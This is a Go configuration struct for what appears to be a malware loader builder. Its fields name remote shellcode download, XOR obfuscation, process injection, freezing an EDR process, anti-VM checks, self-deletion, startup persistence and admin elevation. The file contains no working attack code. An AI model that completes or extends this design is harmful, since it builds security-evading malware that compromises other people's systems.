package config

// BuildConfig holds all settings used to compile the loader stub.
type BuildConfig struct {
	ShellcodeURL    string `json:"shellcode_url"`
	XorKey          string `json:"xor_key"`
	InjectionTarget string `json:"injection_target"`
	EDRProcessName  string `json:"edr_process_name"`
	FreezeTimeMs    int    `json:"freeze_time_ms"`

	EnableAntiVM  bool `json:"enable_anti_vm"`
	EnableMelt    bool `json:"enable_melt"`
	EnableStartup bool `json:"enable_startup"`
	EnableAdmin   bool `json:"enable_admin"`
	SleepDelay    bool `json:"sleep_delay"`
	HideDirectory bool `json:"hide_directory"`

	OutputPath string `json:"output_path"`
}
